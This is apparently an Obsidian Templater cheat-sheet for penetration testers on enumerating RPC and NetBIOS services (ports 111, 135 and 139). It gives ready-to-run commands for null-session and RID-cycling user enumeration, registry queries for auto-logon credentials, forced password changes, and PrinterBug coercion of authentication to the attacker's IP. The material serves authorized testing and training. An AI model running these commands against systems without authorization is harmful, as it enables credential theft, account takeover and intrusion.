# MSRPC / NetBIOS — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let domain = tp.frontmatter.domain; let user = tp.frontmatter.username || '<user>'; let pass = tp.frontmatter.password || '<pass>' -%>

> [!info] Port 111 = rpcbind (Linux), Port 135 = MSRPC (Windows), Port 139 = NetBIOS Session Service (SMB over NetBIOS). These are critical enumeration targets in Windows environments.

---

## Nmap
```bash
nmap -p<% tp.frontmatter.current_port %> --script=msrpc-enum <% ip %>
```

```bash
nmap -p 111,135,139,445 --script=rpcinfo,msrpc-enum,smb-enum-shares,smb-os-discovery <% ip %>
```

---

## RPC Enumeration

### rpcinfo (Linux rpcbind — port 111)
```bash
rpcinfo -p <% ip %>
```

```bash
nmap -p 111 --script=rpcinfo <% ip %>
```

### rpcclient (Windows MSRPC — port 135)
```bash
# Anonymous / null session
rpcclient -U '' -N <% ip %>
```

```bash
# Authenticated
rpcclient -U '<% domain %>/<% user %>%<% pass %>' <% ip %>
```

#### rpcclient commands (run inside session)
```
# System info
srvinfo

# Enumerate users
enumdomusers
queryuser <rid>

# Enumerate groups
enumdomgroups
querygroup <rid>

# RID cycling — brute force all SIDs
for i in $(seq 500 1200); do rpcclient -U '' -N <% ip %> -c "queryuser $i" 2>/dev/null | grep "User Name"; done

# Enumerate domain admins group members
querygroupmem 0x200

# Get domain password policy
getdompwinfo
passwdpolicies

# Enumerate shares
netshareenum
netshareenumall

# Enumerate printers
enumprinters

# List local groups
enumalsgroups domain
enumalsgroups builtin

# Change a user's password (if rights permit)
setuserinfo2 <username> 23 '<newpass>'
```

---

## NetBIOS Enumeration (port 139)
```bash
# NetBIOS name table
nbtscan <% ip %>
```

```bash
nmblookup -A <% ip %>
```

```bash
nmap -p 139 --script=nbstat <% ip %>
```

---

## enum4linux-ng (comprehensive Windows RPC/SMB enum)
```bash
enum4linux-ng -A <% ip %> | tee enum4linux_<% ip %>.txt
```

```bash
enum4linux-ng -A -u '<% user %>' -p '<% pass %>' <% ip %>
```

---

## Impacket RPC Tools
```bash
# Enumerate logged on users and sessions
impacket-netview <% domain %>/<% user %>:'<% pass %>'@<% ip %>
```

```bash
# RPC endpoint mapper
impacket-rpcdump <% ip %> | head -100
```

```bash
# List all RPC endpoints and services
impacket-rpcdump <% ip %> | grep -i 'RemoteRegistry\|WinRM\|DCOM\|Schedule'
```

---

## Print Spooler Enumeration (PrintNightmare / SpoolSample)
```bash
# Check if Print Spooler is running
rpcclient -U '<% domain %>/<% user %>%<% pass %>' <% ip %> -c "enumprinters" 2>/dev/null
```

```bash
# Coerce authentication to attacker via SpoolSample
python3 printerbug.py '<% domain %>/<% user %>:<% pass %>'@<% ip %> <% tp.frontmatter.my_ip %>
```

---

## Registry via RPC (if RemoteRegistry running)
```bash
# Connect via winreg RPC pipe (impacket)
impacket-reg <% domain %>/<% user %>:'<% pass %>'@<% ip %> query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
```

```bash
# Check for auto-logon creds in registry
impacket-reg <% domain %>/<% user %>:'<% pass %>'@<% ip %> query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
```

---

## Interesting RPC Services
```
MS-TSCH (Task Scheduler)  — create scheduled tasks remotely
MS-SAMR (SAM Remote)      — user/group management
MS-DRSR (Directory Replication) — DCSync uses this
MS-SRVS (Server Service)  — share enumeration
MS-SCMR (Service Control) — service creation via psexec
MS-RRP  (Registry)        — read/write registry
```

---

## Notes
